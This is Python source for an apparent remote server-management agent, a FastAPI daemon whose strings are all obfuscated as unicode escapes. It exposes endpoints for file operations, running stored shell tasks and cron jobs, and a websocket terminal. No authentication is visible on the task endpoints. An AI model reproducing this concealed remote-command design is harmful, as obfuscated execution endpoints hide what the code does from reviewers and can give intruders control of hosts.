@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u006e\\u0065\\u0077', 'unicode_escape'), response_model=FileMkdirResponse)
async def O0_fn_44(request: Request, body: FileMkdirRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): codecs.decode('', 'unicode_escape')})
    O0_var_1049 = request.app.state.file_manager
    O0_var_1050 = O0_var_1049.create_directory(body.path)
    return O0_var_1050

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u007a\\u0069\\u0070', 'unicode_escape'), response_model=FileZipResponse)
async def O0_fn_45(request: Request, body: FileZipRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    if not body.items or not isinstance(body.items, list):
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0069\\u0074\\u0065\\u006d\\u0073\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0028\\u006e\\u006f\\u006e\\u002d\\u0065\\u006d\\u0070\\u0074\\u0079\\u0020\\u0061\\u0072\\u0072\\u0061\\u0079\\u0029', 'unicode_escape')})
    O0_var_1051 = request.app.state.file_manager
    O0_var_1052 = O0_var_1051.zip_items(body.path, body.items, flat=bool(body.flat))
    return O0_var_1052

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u002f\\u0075\\u006e\\u007a\\u0069\\u0070', 'unicode_escape'), response_model=FileUnzipResponse)
async def O0_fn_46(request: Request, body: FileUnzipRequest=Body(...)):
    if not body.path:
        return JSONResponse(status_code=400, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0070\\u0061\\u0074\\u0068\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064', 'unicode_escape')})
    O0_var_1053 = request.app.state.file_manager
    O0_var_1054 = O0_var_1053.unzip_archive(body.path, dest_path=body.dest_path, overwrite=bool(body.overwrite), entries=body.entries)
    return O0_var_1054

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskGetResponse)
async def O0_fn_47(request: Request):
    O0_var_1055 = request.app.state.task_manager.get_onetime_tasks()
    return O0_var_1055

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=OneTimeTaskResponse)
async def O0_fn_48(request: Request, tasks: List[str]=Body(default=[])):
    O0_var_1056 = request.app.state.task_manager.set_onetime_tasks(tasks)
    O0_var_1057 = {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(tasks), codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u0073', 'unicode_escape'): tasks, codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1056.get(codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'), False)}
    if Config.InitTask and tasks:
        O0_var_1057[codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape')] = await asyncio.to_thread(request.app.state.task_manager.run_onetime_tasks)
    return O0_var_1057

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_49(request: Request):
    O0_var_1058 = request.app.state.task_manager.get_cron_tasks()
    return O0_var_1058

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=CronTasksResponse)
async def O0_fn_50(request: Request, tasks: Dict[str, str]=Body(default={}, examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape'), codecs.decode('\\u0030\\u0020\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u0030', 'unicode_escape'): codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0077\\u0065\\u0065\\u006b\\u006c\\u0079\\u005f\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u002e\\u0073\\u0068', 'unicode_escape')}])):
    O0_var_1059 = request.app.state.task_manager.set_cron_tasks(tasks)
    return O0_var_1059

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=TaskStatusResponse)
async def O0_fn_51(request: Request):
    return request.app.state.task_manager.get_status()

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065\\u002f\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), response_model=OnetimeExecuteResponse)
async def O0_fn_52(request: Request):
    if not Config.onetasks:
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0020\\u0074\\u0061\\u0073\\u006b\\u0073\\u0020\\u0074\\u006f\\u0020\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): 0, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): []}
    Config.InitTask = True
    O0_var_1060 = await asyncio.to_thread(request.app.state.task_manager.run_onetime_tasks)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_1060), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_1060}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_53(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_1061 = request.app.state.task_manager.get_onetime_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_1061), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_1061)}

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=TaskLogResponse)
async def O0_fn_54(request: Request, limit: int=Query(100, ge=1, le=100)):
    O0_var_1062 = request.app.state.task_manager.get_cron_log(limit)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_1062), codecs.decode('\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): list(O0_var_1062)}

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_55(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'))

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'), response_model=LogClearResponse)
async def O0_fn_56(request: Request):
    return request.app.state.task_manager.clear_logs(codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0061\\u0073\\u006b\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0075\\u006d\\u006d\\u0061\\u0072\\u0079', 'unicode_escape'), response_model=LogSummaryResponse)
async def O0_fn_57(request: Request):

    def O0_fn_58(O0_var_1063):
        O0_var_1064 = list(O0_var_1063)[-10:]
        return {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u005f\\u006c\\u006f\\u0067\\u0067\\u0065\\u0064', 'unicode_escape'): len(O0_var_1063), codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0063\\u0061\\u0070\\u0061\\u0063\\u0069\\u0074\\u0079', 'unicode_escape'): Config.MAX_TASK_LOG_SIZE, codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): sum((1 for O0_var_1065 in O0_var_1064 if O0_var_1065.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape')) == 0)), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u006e\\u0074\\u005f\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'): sum((1 for O0_var_1066 in O0_var_1064 if O0_var_1066.get(codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'), -1) != 0))}
    return {codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): O0_fn_58(Config.onetimetasks_log), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape'): O0_fn_58(Config.crontasks_log)}

@app.get(codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'))
async def O0_fn_59():
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape'): Config.DEBUG, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'): int(time.time()), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION}

@app.get(codecs.decode('\\u002f', 'unicode_escape'))
async def O0_fn_60():
    return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): codecs.decode('\\u0050\\u0072\\u006f\\u0078\\u0079\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'): Config.AGENT_VERSION, codecs.decode('\\u0065\\u006e\\u0064\\u0070\\u006f\\u0069\\u006e\\u0074\\u0073', 'unicode_escape'): {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'): codecs.decode('\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0064\\u006f\\u0063\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0064\\u006f\\u0063\\u0073\\u0020\\u0028\\u4ec5\\u0044\\u0045\\u0042\\u0055\\u0047\\u6a21\\u5f0f\\u0029', 'unicode_escape')}}

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u0073\\u002f\\u007b\\u0070\\u0061\\u0074\\u0068\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
async def O0_fn_61(websocket: WebSocket, path: str, request_id: str=Query(...), token: str=Query(None), meta: str=Query(None), incognito: str=Query(None)):
    O0_var_1067 = TerminalSessionHandler()
    O0_var_1068 = True
    if token is not None:
        O0_var_1068 = False
        O0_var_1069 = Config.ws_downgrade_token()
        if not hmac.compare_digest(token.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), O0_var_1069.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))):
            await websocket.close(code=1008, reason=codecs.decode('\\u0041\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
            Logger.warning(codecs.decode('\\U0001f6a8\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u8ba4\\u8bc1\\u5931\\u8d25\\uff0c\\u975e\\u6cd5\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\uff01', 'unicode_escape'))
            return
        Logger.info(codecs.decode('\\u2705\\u0020\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(request_id) + codecs.decode('\\u005d\\u0020\\u0054\\u006f\\u006b\\u0065\\u006e\\u0020\\u8ba4\\u8bc1\\u901a\\u8fc7\\u0020\\u0028\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u964d\\u7ea7\\u6a21\\u5f0f\\u0029', 'unicode_escape'))
    await O0_var_1067.start_session(websocket, request_id, O0_var_1068, meta_requested=meta == codecs.decode('\\u0031', 'unicode_escape'), incognito_requested=incognito == codecs.decode('\\u0031', 'unicode_escape'))

@app.exception_handler(HTTPException)
async def O0_fn_62(request: Request, exc: HTTPException):
    O0_var_1070 = {codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): exc.detail, codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): exc.status_code}
    return JSONResponse(status_code=exc.status_code, content=O0_var_1070)

class NoSignalsUvicornServer(uvicorn.Server):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u81ea\\u5b9a\\u4e49\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u670d\\u52a1\\u5668\\u7c7b\\u000a\\u0020\\u0020\\u0020\\u0020\\U0001f31f\\u0020\\u6838\\u5fc3\\u6280\\u5de7\\uff1a\\u91cd\\u5199\\u4fe1\\u53f7\\u5b89\\u88c5\\u51fd\\u6570\\u3002\\u76f4\\u63a5\\u0020\\u0070\\u0061\\u0073\\u0073\\u0020\\u6389\\uff0c\\u963b\\u6b62\\u0020\\u0055\\u0076\\u0069\\u0063\\u006f\\u0072\\u006e\\u0020\\u5c1d\\u8bd5\\u5728\\u5b50\\u7ebf\\u7a0b\\u000a\\u0020\\u0020\\u0020\\u0020\\u6ce8\\u518c\\u4e3b\\u7ebf\\u7a0b\\u4e13\\u7528\\u7684\\u7cfb\\u7edf\\u4fe1\\u53f7\\uff08\\u89e3\\u51b3\\u0020\\u0056\\u0061\\u006c\\u0075\\u0065\\u0045\\u0072\\u0072\\u006f\\u0072\\u003a\\u0020\\u0073\\u0065\\u0074\\u005f\\u0077\\u0061\\u006b\\u0065\\u0075\\u0070\\u005f\\u0066\\u0064\\u0020\\u006f\\u006e\\u006c\\u0079\\u0020\\u0077\\u006f\\u0072\\u006b\\u0073\\u0020\\u0069\\u006e\\u0020\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u0068\\u0072\\u0065\\u0061\\u0064\\uff09\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def install_signal_handlers(self) -> None:
        pass

def _start_uvicorn_server(O0_var_1071, host, port, log_level):
    O0_var_1072 = asyncio.new_event_loop()
    asyncio.set_event_loop(O0_var_1072)
    O0_var_1073 = uvicorn.Config(app=O0_var_1071, host=host, port=port, reload=False, log_level=log_level)
    O0_var_1074 = NoSignalsUvicornServer(O0_var_1073)
    O0_var_1074.run()

def O0_fn_63(blocking: bool=False):
    Config.validate()
    O0_fn_2()
    O0_var_1075 = codecs.decode('\\u0064\\u0065\\u0062\\u0075\\u0067', 'unicode_escape') if Config.DEBUG else codecs.decode('\\u0069\\u006e\\u0066\\u006f', 'unicode_escape')
    if Config.DEBUG:
        Logger.warning(codecs.decode('\\u26a0\\ufe0f\\u0020\\u5f53\\u524d\\u5904\\u4e8e\\u0020\\u0044\\u0045\\u0042\\u0055\\u0047\\u0020\\u6a21\\u5f0f\\uff0c\\u4f46\\u7531\\u4e8e\\u91c7\\u7528\\u4e86\\u975e\\u963b\\u585e\\u540e\\u53f0\\u6302\\u8f7d\\uff0c\\u5df2\\u81ea\\u52a8\\u5173\\u95ed\\u70ed\\u91cd\\u8f7d\\u0028\\u0052\\u0065\\u006c\\u006f\\u0061\\u0064\\u0029\\u529f\\u80fd\\u3002', 'unicode_escape'))
    Logger.info(codecs.decode('\\u0020\\U0001f680\\u0020\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5f00\\u59cb\\u5728\\u540e\\u53f0\\u5b88\\u62a4\\u7ebf\\u7a0b\\u4e2d\\u542f\\u52a8\\u002e\\u002e\\u002e', 'unicode_escape'))
    O0_var_1076 = threading.Thread(target=_start_uvicorn_server, args=(app, Config.HOST, Config.PORT, O0_var_1075), daemon=True)
    O0_var_1076.start()
    Logger.info(codecs.decode('\\u0020\\u005b\\u002d\\u005d\\u0020\\u540e\\u53f0\\u670d\\u52a1\\u5df2\\u6210\\u529f\\u6302\\u8f7d\\uff0c\\u6b63\\u5728\\u76d1\\u542c\\u7aef\\u53e3\\u003a\\u0020', 'unicode_escape') + str(Config.PORT))
    if blocking:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            Logger.info(codecs.decode('\\U0001f6d1\\u0020\\u6536\\u5230\\u7ec8\\u6b62\\u4fe1\\u53f7\\uff0c\\u004b\\u0069\\u0073\\u0061\\u006d\\u0061\\u0020\\u0041\\u0067\\u0065\\u006e\\u0074\\u0020\\u5b88\\u62a4\\u8fdb\\u7a0b\\u5df2\\u5b89\\u5168\\u9000\\u51fa\\u3002', 'unicode_escape'))

def cli():
    O0_fn_63(blocking=True)
if __name__ == codecs.decode('\\u005f\\u005f\\u006d\\u0061\\u0069\\u006e\\u005f\\u005f', 'unicode_escape'):
    cli()